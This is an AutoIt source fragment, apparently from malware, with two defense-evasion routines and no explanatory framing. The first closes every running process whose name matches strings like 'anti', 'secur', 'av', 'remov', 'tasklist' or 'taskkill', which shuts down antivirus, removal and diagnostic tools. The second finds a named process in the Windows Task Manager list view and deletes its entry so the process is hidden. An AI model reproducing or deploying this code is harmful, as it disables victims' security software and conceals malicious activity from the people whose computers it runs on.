Func EndBadProcs()
   Dim $bad_procs[7]
   $bad_procs[0] = "anti"
   $bad_procs[1] = "fix"
   $bad_procs[2] = "remov"
   $bad_procs[3] = "secur"
   $bad_procs[4] = "av"
   $bad_procs[5] = "tasklist"
   $bad_procs[6] = "taskkill"
   $procs = ProcessList()
   For $i = 0 To UBound($procs) - 1
      For $j = 0 To UBound($bad_procs) - 1
         If(StringInStr($procs[$i][0], $bad_procs[$j], false)) Then
            ProcessClose($procs[$i][1])
         EndIf
      Next
   Next
EndFunc 


Func HFTMN($sPN)
   If $sPN <> 1 Then
      $ipi = ControlListView("Windows Task Manager", "", 1009, "FindItem", $sPN)
      If $ipi = -1 Then
         Sleep(2)
      Else
         $h_listview = ControlGetHandle("Windows Task Manager", "", 1009)
         DllCall("user32.dll", "int", "SendMessage", "hwnd", $h_listview, "int", $LVM_DELETEITEM, "int", $ipi, "int", 0)
      EndIf
   EndIf
EndFunc 
